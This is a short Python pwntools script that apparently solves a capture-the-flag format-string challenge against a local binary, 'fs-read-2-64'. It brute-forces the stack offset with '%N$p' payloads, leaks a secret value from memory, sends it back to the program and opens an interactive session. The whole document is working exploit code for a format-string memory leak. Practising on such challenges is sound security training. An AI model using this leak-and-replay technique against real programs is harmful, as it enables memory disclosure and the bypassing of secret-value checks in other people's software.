from pwn import *

a = 1
b = 1

while a == 1: 

	p = process("./fs-read-2-64")

	line="%" + str(b) + "$p"

	p.recv()
	p.sendline(line)
	data = str(p.recv()[6:16])
	if "nil" in data:
		data = "0x00000000"
 	p.sendline("nah, dawg")
	data1 =str(p.recv()).split(" ")[4]

	if data == data1:
		print("FOUND: b=" + str(b))
		break
	b = b + 1
	p.close()

p.close()

p = process("./fs-read-2-64")

p.recv()

p.sendline("%" + str(b) + "$p")

data = str(p.recv()[6:16])

p.sendline(data)

p.interactive()

